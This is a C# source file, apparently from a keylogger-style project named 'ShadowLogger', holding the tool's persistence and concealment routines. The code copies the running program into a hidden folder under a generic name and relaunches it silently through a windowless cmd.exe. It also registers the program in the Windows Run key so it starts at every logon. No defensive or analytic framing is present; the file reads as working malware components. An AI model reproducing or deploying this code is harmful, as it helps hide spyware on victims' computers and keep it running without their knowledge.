using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ShadowLogger.bin.HelperMethods {
    internal class SystemStartup {
        internal static void ChangeAppPath() {
            string pathToCopy = GlobalVariables.GlobalVariables.AppDirectoryLocation + "\\name.exe";

            if (File.Exists(pathToCopy)) {
                File.Delete(pathToCopy);
            }

            if (!Directory.Exists(GlobalVariables.GlobalVariables.AppDirectoryLocation)) {
                Directory.CreateDirectory(GlobalVariables.GlobalVariables.AppDirectoryLocation);
            }

            File.Copy(Application.ExecutablePath, pathToCopy);
            File.SetAttributes(pathToCopy, FileAttributes.Hidden);
            File.SetAttributes(GlobalVariables.GlobalVariables.AppDirectoryLocation, FileAttributes.Hidden);

            ProcessStartInfo procStartInfo = new ProcessStartInfo {
                FileName = "cmd.exe",
                Arguments = $@"/c ping 1.1.1.1 -n 1 -w 5000 > NUL & start """" ""{pathToCopy}""",
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process.Start(procStartInfo);
            Application.Exit();
        }

        internal static void AddToStartup() {
            if (Application.StartupPath != GlobalVariables.GlobalVariables.AppDirectoryLocation) return;

            RegistryKey regkey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (regkey != null && regkey.GetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath)) == null) {
                regkey.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), Application.ExecutablePath);
                regkey.Close();
            }
            else {
                regkey?.Close();
            }
        }
    }
}
